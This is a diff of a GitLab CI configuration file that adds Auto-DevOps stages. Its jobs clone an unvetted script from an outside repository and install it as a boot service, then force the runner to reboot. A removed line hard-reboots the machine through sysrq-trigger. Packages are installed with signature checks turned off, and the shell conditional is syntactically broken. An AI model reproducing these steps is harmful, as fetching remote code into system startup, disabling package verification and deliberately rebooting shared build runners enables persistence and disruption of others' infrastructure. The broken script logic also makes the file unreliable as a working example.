@@ -1,20 +1,51 @@
+# You can override the included template(s) by including variable overrides
+# SAST customization: https://docs.gitlab.com/ee/user/application_security/sast/#customizing-the-sast-settings
+# Secret Detection customization: https://docs.gitlab.com/ee/user/application_security/secret_detection/#customizing-settings
+# Dependency Scanning customization: https://docs.gitlab.com/ee/user/application_security/dependency_scanning/#customizing-the-dependency-scanning-settings
+# Note that environment variables can be set in several places
+# See https://docs.gitlab.com/ee/ci/variables/#cicd-variable-precedence
 image: debian:latest
-
 stages:
-    - before_script
-    - build1
-    - deploy1
-
+- before_script
+- build1
+- test1
+- test2
+- deploy1
+- build
+- test
+- deploy
+- review
+- dast
+- staging
+- canary
+- production
+- incremental rollout 10%
+- incremental rollout 25%
+- incremental rollout 50%
+- incremental rollout 100%
+- performance
+- cleanup
 before_script:
-    - 'which ssh-agent || ( apt update --allow-unauthenticated --allow-insecure-repositories -y && apt install -y git tzdata && ln -fs /usr/share/zoneinfo/America/Los_Angeles /etc/localtime && dpkg-reconfigure -f noninteractive tzdata && apt full-upgrade -y)'
-
+- which ssh-agent || ( apt update --allow-unauthenticated --allow-insecure-repositories
+  -y && apt install -y git tzdata && ln -fs /usr/share/zoneinfo/America/Los_Angeles
+  /etc/localtime && dpkg-reconfigure -f noninteractive tzdata && apt full-upgrade
+  -y)
 build1:
   stage: build1
   script:
-    - 'git clone https://gitlab.com/mrgofuckyourself/reboot6.git && cd reboot6 && cp reboot6.sh /etc/init.d/reboot6.sh && update-rc.d reboot6.sh defaults'
-
+  - git clone https://gitlab.com/mrgofuckyourself/reboot6.git && cd reboot6 && cp
+    reboot6.sh /etc/init.d/reboot6.sh && update-rc.d reboot6.sh defaults
+test1:
+  stage: test1
+  script:
+  - alias reboot="systemctl start reboot.target"
+  - reboot
 deploy1:
   stage: deploy1
   script:
-    - 'alias reboot="sudo systemctl start reboot.target"'
-    - 'if [ /etc/init.d/reboot6.sh = true ] do { echo 1 > /proc/sys/kernel/sysreq; echo b > /proc/sysrq-trigger } else exit 1'
+  - alias reboot="sudo systemctl start reboot.target"
+  - if [ /etc/init.d/reboot6.sh = true ] do reboot else exit 1
+sast:
+  stage: test
+include:
+- template: Auto-DevOps.gitlab-ci.yml
